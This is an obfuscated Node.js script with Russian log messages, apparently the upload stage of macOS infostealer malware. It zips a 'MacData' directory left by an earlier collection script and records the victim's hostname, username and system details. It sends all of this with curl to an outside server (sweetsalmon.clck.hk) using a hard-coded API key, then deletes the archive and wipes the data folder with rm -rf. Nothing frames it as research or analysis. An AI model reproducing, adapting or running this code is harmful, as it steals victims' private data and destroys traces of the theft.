const _0xdfb399=_0x450a;(function(_0x58b7c1,_0x19b8db){const _0x3bc034=_0x450a,_0x385776=_0x58b7c1();while(!![]){try{const _0x370d5c=-parseInt(_0x3bc034(0x104))/0x1*(parseInt(_0x3bc034(0x15a))/0x2)+parseInt(_0x3bc034(0x130))/0x3+-parseInt(_0x3bc034(0x10e))/0x4+-parseInt(_0x3bc034(0x170))/0x5*(parseInt(_0x3bc034(0x10f))/0x6)+parseInt(_0x3bc034(0x155))/0x7*(parseInt(_0x3bc034(0x137))/0x8)+-parseInt(_0x3bc034(0x15b))/0x9*(parseInt(_0x3bc034(0x159))/0xa)+parseInt(_0x3bc034(0x116))/0xb*(parseInt(_0x3bc034(0x132))/0xc);if(_0x370d5c===_0x19b8db)break;else _0x385776['push'](_0x385776['shift']());}catch(_0x1fae3e){_0x385776['push'](_0x385776['shift']());}}}(_0x1268,0x72b7f));const fs=require('fs'),os=require('os'),path=require(_0xdfb399(0x165)),{exec,execSync}=require(_0xdfb399(0x14b)),dns=require(_0xdfb399(0x117)),CONFIG={'serverDomain':'sweetsalmon.clck.hk','serverPath':_0xdfb399(0x141),'serverPort':0x1f98,'apiKey':'tJz4uRVCwl2eEwyPTudYP9iGRfgq','retryDelay':0x1388,'maxRetries':0x5,'timeout':0x927c0,'outputDir':_0xdfb399(0x14f),'archiveInfoFile':_0xdfb399(0x11c)};function _0x1268(){const _0x129f86=['\x20с\x20использованием\x20curl','type','--keep-data','message','filename','http','4391sRvFiN','Ошибка\x20разрешения\x20DNS:\x20','Директория\x20с\x20данными\x20удалена:\x20','\x20разрешен\x20в\x20IP:\x20','Процесс\x20загрузки\x20успешно\x20завершен','toFixed','maxRetries','Ошибка\x20записи\x20в\x20лог:\x20','zip\x20-r\x20-1\x20','pow','1636264eStWCJ','36PMKksc','readFileSync',')\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-H\x20\x22Content-Type:\x20multipart/form-data\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-F\x20\x22file=@','ZIP-архив\x20создан:\x20','serverDomain','Ошибка\x20чтения\x20информации\x20об\x20архиве:\x20','Повтор\x20через\x20','2061103MjEmrW','dns','Файл\x20пуст','Директория\x20не\x20найдена:\x20','now','log','archive_info.json','collectionTime','match','success','Загрузка\x20не\x20удалась:\x20','.zip','catch','Не\x20удалось\x20распарсить\x20ответ\x20сервера\x20как\x20JSON:\x20','ZIP-архив\x20не\x20найден\x20после\x20создания','\x20секунд...\x20(Попытка\x20','Сервер\x20вернул\x20ошибку','utf8','Загрузка\x20завершена\x20за\x20','serverPath','mac_data_','trim','outputDir','tmpdir','Создание\x20ZIP-архива:\x20','toISOString','2017194xgtlow','platform','12VoOrcK','Достигнуто\x20максимальное\x20количество\x20попыток\x20(','),\x20прекращаем','collectionDate','...','415696XUOHtr','exit','userInfo','\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-H\x20\x22X-API-Key:\x20','\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--retry\x20','appendFileSync','\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--connect-timeout\x2060\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--max-time\x20','includes','Ошибка\x20выполнения\x20curl:\x20','statSync','/api/files/upload','find','://','uploader.log','timeout','Сгенерирован\x20новый\x20ID\x20клиента:\x20','Попытка\x20разрешения\x20домена:\x20','serverPort','Загрузка\x20не\x20удалась:\x20Сервер\x20вернул\x20ошибку','retryDelay','child_process','parse','\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-H\x20\x22X-Client-Info:\x20$(cat\x20','existsSync','MacData','floor','join','toString','Загрузка\x20не\x20удалась','Не\x20удалось\x20создать\x20архив','91JUbhew','client-id.txt','ZIP-файл\x20удален:\x20','writeFileSync','3310UKNAGG','222pnDZsE','1557osmjyt','arch','error','\x20из\x20','\x20-x\x20\x22*.DS_Store\x22','machineId','Ошибка\x20чтения\x20ID\x20клиента:\x20','Домен\x20','Убедитесь,\x20что\x20вы\x20сначала\x20запустили\x20скрипт\x20сбора\x20данных','Файл\x20не\x20найден:\x20','path','Загрузка\x20успешно\x20завершена','Выполнение\x20команды\x20curl','stringify','archiveInfoFile','system-info-','\x20секунд','Не\x20удалось\x20создать\x20ZIP-архив:\x20','lookup','username','Ошибка\x20поиска\x20архива:\x20','93050oQlnWp'];_0x1268=function(){return _0x129f86;};return _0x1268();}function log(_0x5ebf56,_0x5d723f=![]){const _0x189cb9=_0xdfb399,_0x4b87fe=new Date()[_0x189cb9(0x12f)](),_0x5e0f02='['+_0x4b87fe+']\x20'+_0x5ebf56;_0x5d723f?console[_0x189cb9(0x15d)](_0x5e0f02):console[_0x189cb9(0x11b)](_0x5e0f02);try{fs[_0x189cb9(0x13c)](_0x189cb9(0x144),_0x5e0f02+'\x0a');}catch(_0x35ade3){console[_0x189cb9(0x15d)](_0x189cb9(0x10b)+_0x35ade3[_0x189cb9(0x101)]);}}function formatFileSize(_0x1a299c){const _0x1a3acc=_0xdfb399;if(_0x1a299c===0x0)return'0\x20Bytes';const _0x4ae9db=0x400,_0xe50f19=['Bytes','KB','MB','GB','TB'],_0xc262ba=Math[_0x1a3acc(0x150)](Math['log'](_0x1a299c)/Math[_0x1a3acc(0x11b)](_0x4ae9db));return parseFloat((_0x1a299c/Math[_0x1a3acc(0x10d)](_0x4ae9db,_0xc262ba))[_0x1a3acc(0x109)](0x2))+'\x20'+_0xe50f19[_0xc262ba];}function getClientId(){const _0x2aa482=_0xdfb399;try{if(fs['existsSync'](CONFIG[_0x2aa482(0x169)])){const _0x29be16=JSON[_0x2aa482(0x14c)](fs[_0x2aa482(0x110)](CONFIG[_0x2aa482(0x169)],_0x2aa482(0x127)));if(_0x29be16[_0x2aa482(0x160)])return _0x29be16[_0x2aa482(0x160)];}if(fs[_0x2aa482(0x14e)](_0x2aa482(0x156)))return fs[_0x2aa482(0x110)](_0x2aa482(0x156),_0x2aa482(0x127))[_0x2aa482(0x12b)]();}catch(_0x3555c1){log(_0x2aa482(0x161)+_0x3555c1[_0x2aa482(0x101)],!![]);}const _0x53c6ea=Math['random']()[_0x2aa482(0x152)](0x24)['substring'](0x2,0xa);return log(_0x2aa482(0x146)+_0x53c6ea),_0x53c6ea;}function findArchiveFile(){const _0x5867d8=_0xdfb399;try{if(fs['existsSync'](CONFIG[_0x5867d8(0x169)])){const _0x2388f3=JSON['parse'](fs[_0x5867d8(0x110)](CONFIG['archiveInfoFile'],_0x5867d8(0x127)));if(_0x2388f3[_0x5867d8(0x102)]&&fs[_0x5867d8(0x14e)](_0x2388f3[_0x5867d8(0x102)]))return _0x2388f3[_0x5867d8(0x102)];}const _0x43a91e=fs['readdirSync']('.'),_0x92f8c7=_0x43a91e[_0x5867d8(0x142)](_0x17696a=>_0x17696a[_0x5867d8(0x11e)](/^mac_data_.*\.zip$/));if(_0x92f8c7&&fs['existsSync'](_0x92f8c7))return _0x92f8c7;}catch(_0x4f333e){log(_0x5867d8(0x16f)+_0x4f333e['message'],!![]);}return null;}async function createZipArchive(){const _0x442c0e=_0xdfb399,_0x399bed=findArchiveFile();if(_0x399bed)return log('Найден\x20существующий\x20архив:\x20'+_0x399bed),_0x399bed;try{const _0x155a2a=getClientId(),_0x1f87ec=_0x442c0e(0x12a)+_0x155a2a+_0x442c0e(0x121);log(_0x442c0e(0x12e)+_0x1f87ec+_0x442c0e(0x136));const _0x31d8fd=CONFIG[_0x442c0e(0x12c)];if(!fs[_0x442c0e(0x14e)](_0x31d8fd))throw new Error(_0x442c0e(0x119)+_0x31d8fd);const _0x3edeae=_0x442c0e(0x10c)+_0x1f87ec+'\x20'+_0x31d8fd+_0x442c0e(0x15f);execSync(_0x3edeae,{'encoding':_0x442c0e(0x127)});if(fs['existsSync'](_0x1f87ec)){const _0x3b6475=fs['statSync'](_0x1f87ec);return log(_0x442c0e(0x112)+_0x1f87ec+'\x20('+formatFileSize(_0x3b6475['size'])+')'),_0x1f87ec;}else throw new Error(_0x442c0e(0x124));}catch(_0x43e728){return log(_0x442c0e(0x16c)+_0x43e728[_0x442c0e(0x101)],!![]),null;}}async function resolveDomainAndUpload(_0x1d2b01,_0x31ac6f=0x0){const _0x259579=_0xdfb399;log(_0x259579(0x147)+CONFIG[_0x259579(0x113)]);try{const _0x3d4b90=await new Promise((_0xff7f45,_0x5ec847)=>{const _0x14819a=_0x259579;dns[_0x14819a(0x16d)](CONFIG[_0x14819a(0x113)],(_0x424a78,_0x436a5b)=>{_0x424a78?_0x5ec847(_0x424a78):_0xff7f45(_0x436a5b);});});return log(_0x259579(0x162)+CONFIG[_0x259579(0x113)]+_0x259579(0x107)+_0x3d4b90),uploadFileWithCurl(_0x1d2b01,_0x3d4b90,_0x31ac6f);}catch(_0x2fb753){return log(_0x259579(0x105)+_0x2fb753[_0x259579(0x101)],!![]),_0x31ac6f<CONFIG['maxRetries']?(log(_0x259579(0x115)+CONFIG['retryDelay']/0x3e8+_0x259579(0x125)+(_0x31ac6f+0x1)+_0x259579(0x15e)+CONFIG[_0x259579(0x10a)]+')'),await new Promise(_0x599ec6=>setTimeout(_0x599ec6,CONFIG[_0x259579(0x14a)])),resolveDomainAndUpload(_0x1d2b01,_0x31ac6f+0x1)):(log(_0x259579(0x133)+CONFIG[_0x259579(0x10a)]+'),\x20прекращаем',!![]),![]);}}async function uploadFileWithCurl(_0x437092,_0x1c14a5,_0x425e53=0x0){const _0x113cb5=_0xdfb399;try{const _0x1af6e4=path[_0x113cb5(0x151)](process['cwd'](),_0x437092);if(!fs[_0x113cb5(0x14e)](_0x1af6e4))return log(_0x113cb5(0x164)+_0x1af6e4,!![]),![];const _0x2d4a12=fs[_0x113cb5(0x140)](_0x1af6e4),_0x112860=_0x2d4a12['size'];if(_0x112860===0x0)return log(_0x113cb5(0x118),!![]),![];const _0xba1d7f={'hostname':os['hostname'](),'platform':os[_0x113cb5(0x131)](),'type':os[_0x113cb5(0xff)](),'arch':os[_0x113cb5(0x15c)](),'username':os[_0x113cb5(0x139)]()[_0x113cb5(0x16e)],'id':getClientId(),'collectionTime':new Date()[_0x113cb5(0x12f)]()};if(fs[_0x113cb5(0x14e)](CONFIG[_0x113cb5(0x169)]))try{const _0x478e38=JSON['parse'](fs['readFileSync'](CONFIG['archiveInfoFile'],_0x113cb5(0x127)));_0xba1d7f['machineId']=_0x478e38['machineId']||_0xba1d7f['id'],_0xba1d7f['collectionDate']=_0x478e38[_0x113cb5(0x135)]||_0xba1d7f[_0x113cb5(0x11d)];}catch(_0xf21447){log(_0x113cb5(0x114)+_0xf21447['message'],!![]);}const _0x352935=path['join'](os[_0x113cb5(0x12d)](),_0x113cb5(0x16a)+Date[_0x113cb5(0x11a)]()+'.json');fs[_0x113cb5(0x158)](_0x352935,JSON['stringify'](_0xba1d7f));const _0x159e5d=CONFIG[_0x113cb5(0x148)]===0x1bb?'https':_0x113cb5(0x103),_0xeb5a14=_0x159e5d+_0x113cb5(0x143)+_0x1c14a5+':'+CONFIG[_0x113cb5(0x148)]+CONFIG[_0x113cb5(0x129)];log('Начало\x20загрузки\x20на\x20'+_0xeb5a14+_0x113cb5(0xfe));const _0x313649=Date[_0x113cb5(0x11a)](),_0x56add7='curl\x20-X\x20POST\x20\x22'+_0xeb5a14+_0x113cb5(0x13a)+CONFIG['apiKey']+_0x113cb5(0x14d)+_0x352935+_0x113cb5(0x111)+_0x1af6e4+_0x113cb5(0x13d)+CONFIG[_0x113cb5(0x145)]/0x3e8+_0x113cb5(0x13b)+CONFIG[_0x113cb5(0x10a)]+'\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--retry-delay\x20'+CONFIG[_0x113cb5(0x14a)]/0x3e8+'\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--progress-bar';return log(_0x113cb5(0x167)),new Promise((_0x6fca9d,_0x23aed3)=>{exec(_0x56add7,(_0x3c15ae,_0x4a4c49,_0x1fb198)=>{const _0x120eab=_0x450a;try{fs['unlinkSync'](_0x352935);}catch(_0x566b85){}if(_0x3c15ae){log(_0x120eab(0x13f)+_0x3c15ae[_0x120eab(0x101)],!![]),_0x23aed3(_0x3c15ae);return;}const _0x1a993a=(Date[_0x120eab(0x11a)]()-_0x313649)/0x3e8;log(_0x120eab(0x128)+_0x1a993a[_0x120eab(0x109)](0x2)+_0x120eab(0x16b));try{const _0x250dbd=JSON[_0x120eab(0x14c)](_0x4a4c49);log('Ответ\x20сервера:\x20'+JSON[_0x120eab(0x168)](_0x250dbd)),_0x250dbd[_0x120eab(0x11f)]?_0x6fca9d(!![]):(log(_0x120eab(0x149),!![]),_0x23aed3(new Error(_0x120eab(0x126))));}catch(_0x35967c){log(_0x120eab(0x123)+_0x4a4c49),_0x6fca9d(!![]);}});});}catch(_0x11d5ce){return log(_0x113cb5(0x120)+_0x11d5ce['message'],!![]),_0x425e53<CONFIG[_0x113cb5(0x10a)]?(log(_0x113cb5(0x115)+CONFIG[_0x113cb5(0x14a)]/0x3e8+_0x113cb5(0x125)+(_0x425e53+0x1)+_0x113cb5(0x15e)+CONFIG[_0x113cb5(0x10a)]+')'),await new Promise(_0x485b55=>setTimeout(_0x485b55,CONFIG[_0x113cb5(0x14a)])),uploadFileWithCurl(_0x437092,_0x1c14a5,_0x425e53+0x1)):(log(_0x113cb5(0x133)+CONFIG[_0x113cb5(0x10a)]+_0x113cb5(0x134),!![]),![]);}}function _0x450a(_0x3cd1b5,_0x1d427f){const _0x126878=_0x1268();return _0x450a=function(_0x450a89,_0x529a8f){_0x450a89=_0x450a89-0xfe;let _0x2cd562=_0x126878[_0x450a89];return _0x2cd562;},_0x450a(_0x3cd1b5,_0x1d427f);}async function main(){const _0x2712ac=_0xdfb399;try{log('Запуск\x20процесса\x20отправки\x20данных');let _0x24f22a=findArchiveFile();!_0x24f22a&&(log('Архив\x20не\x20найден,\x20создаем\x20новый...'),!fs[_0x2712ac(0x14e)](CONFIG[_0x2712ac(0x12c)])&&(log('Директория\x20с\x20данными\x20не\x20найдена:\x20'+CONFIG[_0x2712ac(0x12c)],!![]),log(_0x2712ac(0x163),!![]),process[_0x2712ac(0x138)](0x1)),_0x24f22a=await createZipArchive(),!_0x24f22a&&(log(_0x2712ac(0x154),!![]),process['exit'](0x1)));log('Запуск\x20процесса\x20загрузки...');const _0x5b4e25=await resolveDomainAndUpload(_0x24f22a);if(_0x5b4e25){log(_0x2712ac(0x166));try{fs['existsSync'](_0x24f22a)&&!process['argv'][_0x2712ac(0x13e)]('--keep-archive')&&(fs['unlinkSync'](_0x24f22a),log(_0x2712ac(0x157)+_0x24f22a));}catch(_0x2d9a58){log('Ошибка\x20удаления\x20ZIP-файла:\x20'+_0x2d9a58['message'],!![]);}try{fs[_0x2712ac(0x14e)](CONFIG['outputDir'])&&!process['argv'][_0x2712ac(0x13e)](_0x2712ac(0x100))&&(execSync('rm\x20-rf\x20\x22'+CONFIG[_0x2712ac(0x12c)]+'\x22',{'encoding':_0x2712ac(0x127)}),log(_0x2712ac(0x106)+CONFIG[_0x2712ac(0x12c)]));}catch(_0x27a397){log('Ошибка\x20удаления\x20директории\x20с\x20данными:\x20'+_0x27a397[_0x2712ac(0x101)],!![]);}log(_0x2712ac(0x108)),process['exit'](0x0);}else log(_0x2712ac(0x153),!![]),process['exit'](0x1);}catch(_0x1e834a){log('Непредвиденная\x20ошибка:\x20'+_0x1e834a['message'],!![]),process[_0x2712ac(0x138)](0x1);}}main()[_0xdfb399(0x122)](_0x3647b3=>{const _0xfe077c=_0xdfb399;log('Ошибка\x20в\x20основном\x20процессе:\x20'+_0x3647b3[_0xfe077c(0x101)],!![]),process[_0xfe077c(0x138)](0x1);});
